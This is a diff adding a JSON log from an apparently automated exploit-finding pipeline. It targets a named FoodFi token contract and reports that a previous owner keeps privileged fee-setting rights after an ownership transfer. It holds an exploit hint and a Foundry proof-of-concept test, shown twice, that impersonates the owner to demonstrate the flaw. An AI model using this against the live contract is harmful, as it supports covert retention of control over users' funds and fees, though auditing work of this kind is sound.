@@ -1,0 +1,55 @@
+{
+  "project_id": "FoodFi_0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf",
+  "target_address": "0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf",
+  "finding_id": 0,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf",
+    "vulnerability_type": "Unauthorized Ownership Transfer",
+    "violation_category": "LOGIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the current contract owner to initiate ownership transfer",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "isAuthorized(previous_owner_address)",
+        "operator": "==",
+        "expected_value": "true"
+      }
+    },
+    "exploit_hint": "1. As current owner, call transferOwnership() to transfer ownership to a new address. 2. After transfer, verify the previous owner's authorization status remains true by calling isAuthorized(previous_owner). 3. The previous owner can still call all functions with the 'authorized' modifier including setBuyFees, setSellFees, setIsFeeExempt, setFeeReceivers, etc. This allows the previous owner to maintain privileged access even after relinquishing ownership."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IFoodFi {\n    function transferOwnership(address payable adr) external;\n    function isAuthorized(address adr) external view returns (bool);\n    function isOwner(address account) external view returns (bool);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        vm.label(TARGET, \"FoodFi Contract\");\n        vm.label(attacker, \"Attacker\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        // Step 1: Read current owner from storage slot 0\n        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));\n        address previousOwner = address(uint160(uint256(ownerSlot)));\n        vm.label(previousOwner, \"Previous Owner\");\n        \n        // Step 2: Impersonate the current owner\n        vm.startPrank(previousOwner);\n        \n        // Step 3: Transfer ownership to attacker (or any new address)\n        IFoodFi(TARGET).transferOwnership(payable(attacker));\n        \n        // Step 4: Stop prank\n        vm.stopPrank();\n        \n        // Step 5: Verify the vulnerability - previous owner is STILL authorized\n        bool isPreviousOwnerAuthorized = IFoodFi(TARGET).isAuthorized(previousOwner);\n        \n        // Oracle verification: previous owner's authorization status should remain true\n        assertEq(isPreviousOwnerAuthorized, true, \"VULNERABILITY: Previous owner should still be authorized after ownership transfer\");\n        \n        // Additional verification: confirm ownership actually changed\n        bool isAttackerOwner = IFoodFi(TARGET).isOwner(attacker);\n        assertEq(isAttackerOwner, true, \"Ownership should have transferred to attacker\");\n        assertEq(IFoodFi(TARGET).isAuthorized(previousOwner), true, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The vulnerability exists in the Auth contract's transferOwnership() function. When ownership is transferred, the function sets authorizations[adr] = true for the NEW owner but NEVER removes authorization from the PREVIOUS owner (authorizations[previous_owner] = false is missing). This means the previous owner retains all 'authorized' modifier privileges even after relinquishing ownership, allowing them to continue calling privileged functions like setBuyFees, setSellFees, setIsFeeExempt, setFeeReceivers, etc.",
+      "attack_strategy": "1. Read the current owner address from storage slot 0. 2. Impersonate the current owner using vm.startPrank(). 3. Call transferOwnership() to transfer ownership to a new address. 4. Verify that the previous owner's isAuthorized() status remains true, demonstrating the vulnerability.",
+      "step_by_step_plan": "1. Load the owner address from storage slot 0 using vm.load(). 2. Start prank as the previous owner. 3. Call transferOwnership() to transfer to attacker address. 4. Stop prank. 5. Call isAuthorized(previousOwner) and assert it returns true. This proves the previous owner retains authorization after ownership transfer.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IFoodFi {\n    function transferOwnership(address payable adr) external;\n    function isAuthorized(address adr) external view returns (bool);\n    function isOwner(address account) external view returns (bool);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        vm.label(TARGET, \"FoodFi Contract\");\n        vm.label(attacker, \"Attacker\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        // Step 1: Read current owner from storage slot 0\n        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));\n        address previousOwner = address(uint160(uint256(ownerSlot)));\n        vm.label(previousOwner, \"Previous Owner\");\n        \n        // Step 2: Impersonate the current owner\n        vm.startPrank(previousOwner);\n        \n        // Step 3: Transfer ownership to attacker (or any new address)\n        IFoodFi(TARGET).transferOwnership(payable(attacker));\n        \n        // Step 4: Stop prank\n        vm.stopPrank();\n        \n        // Step 5: Verify the vulnerability - previous owner is STILL authorized\n        bool isPreviousOwnerAuthorized = IFoodFi(TARGET).isAuthorized(previousOwner);\n        \n        // Oracle verification: previous owner's authorization status should remain true\n        assertEq(isPreviousOwnerAuthorized, true, \"VULNERABILITY: Previous owner should still be authorized after ownership transfer\");\n        \n        // Additional verification: confirm ownership actually changed\n        bool isAttackerOwner = IFoodFi(TARGET).isOwner(attacker);\n        assertEq(isAttackerOwner, true, \"Ownership should have transferred to attacker\");\n        assertEq(IFoodFi(TARGET).isAuthorized(previousOwner), true, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 60.84727716445923,
+      "prompt_tokens": 22038,
+      "completion_tokens": 3854,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 60.84961700439453,
+  "total_prompt_tokens": 22038,
+  "total_completion_tokens": 3854,
+  "total_cost": 0.0
+}
